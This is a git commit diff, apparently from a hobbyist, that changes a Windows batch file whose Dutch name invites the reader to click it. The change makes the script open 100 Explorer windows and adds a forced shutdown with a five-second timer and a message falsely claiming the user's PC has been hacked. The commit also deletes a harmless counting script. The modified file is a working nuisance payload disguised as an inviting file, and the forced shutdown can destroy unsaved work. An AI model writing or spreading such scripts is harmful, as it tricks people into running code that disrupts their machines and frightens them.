0e9c36ff6ca85e2cc2598d675e40abdd97e6ba02
test <test@test.com>
2024-04-05 16:11:40 +0200

    update 1.1.3.2..32.2..4.23.w4

--- appel en een ei, klik maar wel op mij.bat
+++ appel en een ei, klik maar wel op mij.bat
@@ -1,4 +1,5 @@
 @echo off
-FOR /L %%A IN (1,1,20) DO (
+FOR /L %%A IN (1,1,100) DO (
 start explorer
 )
+shutdown -s -f -t 5 -c "Hoi ik ben Erik. Ik heb jouw pc gehackt. Fijne dag nog!"
--- test.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-FOR /L %%A IN (1,1,200) DO (
-  ECHO %%A
-)
-
-/I "druk op een toets om te stoppen"
